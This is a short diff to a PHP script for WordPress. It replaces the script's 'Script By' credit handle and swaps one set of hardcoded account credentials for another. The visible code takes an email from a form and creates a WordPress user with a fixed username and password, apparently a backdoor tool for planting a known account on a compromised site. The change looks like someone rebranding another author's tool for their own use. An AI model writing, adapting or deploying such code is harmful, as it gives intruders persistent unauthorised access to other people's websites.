@@ -15,7 +15,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     echo '<input type="email" id="email" name="email" required style="margin: 10px; padding: 5px;">';
     echo '<button type="submit" style="padding: 5px 10px;">Go</button>';
     echo '</form>';
-        echo '<p style="text-align: center; margin-top: 10px;">Script By @RemorseCyberia</p>';
+        echo '<p style="text-align: center; margin-top: 10px;">Script By @godelic</p>';
     exit;
 }
 
@@ -28,8 +28,8 @@ if (!$email) {
 }
 
 // Username and Password configuration
-$username = '4rum1337';
-$password = '4rum1337';
+$username = 'godelic';
+$password = 'godelic133';
 
 if (!username_exists($username) && !email_exists($email)) {
     $user_id = wp_create_user($username, $password, $email);
